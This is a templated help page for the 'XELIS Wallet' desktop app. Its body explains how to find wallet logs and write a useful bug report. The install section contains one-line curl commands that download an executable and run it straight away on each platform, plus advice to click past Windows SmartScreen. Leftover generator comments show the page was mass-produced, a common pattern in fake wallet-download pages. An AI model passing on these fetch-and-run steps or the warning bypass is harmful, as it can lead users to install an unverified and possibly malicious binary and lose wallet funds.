![XELIS Wallet logs: read them and report a real bug](assets/banner-article.png)
# XELIS Wallet logs: read them and report a real bug

Find the evidence, describe the failure once and report it usefully.

## Downloads - Logs

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> Logs can contain your addresses. Share the error lines, not your phrase, and never paste a phrase into a bug report.

Wallet logs record what the app did and which errors it hit. Reproduce the failure once, note the version, the platform and the exact message, then attach the log to the report. A report with those four things can be acted on; a screenshot alone usually cannot.

<!-- ARTICLE-BODY-BEGIN -->
## What the logs are for

The log is the app's own account of a session: startup, node connection attempts, sync progress and error text, all written by the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> you are running. When a symptom is hard to reproduce, the log is often the only place the actual error appears in words rather than as a spinner.

Reading it is not a developer task. Looking for the line that repeats at the moment the failure happens is usually enough to tell a connection problem from a data problem, and that distinction decides which fix article applies.

## Reproduce the failure once, on a known version

Close the app, open it, perform the action that fails, and note the time. A single clean reproduction gives the log a narrow window, which is far more useful than a file full of sessions.

Before you reproduce anything, confirm the build you are running matches the release page; an error that was fixed two versions ago wastes everyone's time. The version check is part of <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md">update XELIS Wallet safely</a>, and it takes a minute.

## Four things every report needs

| Item | Why it matters |
| --- | --- |
| Version of XELIS Wallet | Decides whether the bug is already fixed |
| Platform and architecture | Windows, macOS and Linux fail differently |
| Exact error text or log excerpt | Lets someone search the code and the issue history |
| What you did just before it failed | Turns a symptom into a reproduction |

Add the transaction identifier when the failure involves a payment. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md">XELIS Wallet pending transaction</a> shows where that identifier appears, and it is the difference between "my send is stuck" and a report someone can check.

## Where logs live and how to read them

The app writes its log to a file in the platform's application-data area, and the exact folder differs by OS and by install. Rather than guessing a path, look for the log location in the app's own settings or help area, or the folder that opens when the app offers to reveal it. If neither exists in your build, capture the terminal output instead: launching from a terminal shows the same messages on screen for that session.

Once you have the file, search it for the time of your reproduction and read the lines immediately around it. Errors tend to name a subsystem, an endpoint or a timeout, and that name is the part worth quoting.

## When the log points at the network

If the repeated line mentions a connection, a timeout or an endpoint, the problem is likely between the wallet and its node rather than inside the wallet. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md">Fix XELIS Wallet connection errors</a> covers that path step by step.

If you would rather remove the remote endpoint from the picture entirely, <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md">XELIS Wallet with a local node</a> is the setup for that.

## FAQ
### Where are XELIS Wallet logs?
In the app's application-data folder for your platform, reachable from the app's settings or by running it from a terminal. The exact folder varies by install.

### Are logs safe to share?
They can contain addresses and endpoints. Read them first, quote the error lines, and remove anything you do not want public.

### Do I need to reproduce the bug before reporting it?
Yes, once. A single clean reproduction narrows the log to a window someone can read.

### What if the app will not start at all?
Run it from a terminal and capture the output. A startup failure usually prints before any window appears.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Fix XELIS Wallet connection errors](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md)
- [XELIS Wallet pending transaction](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
- [XELIS Wallet with a local node](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md)
- [Update XELIS Wallet safely](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md)
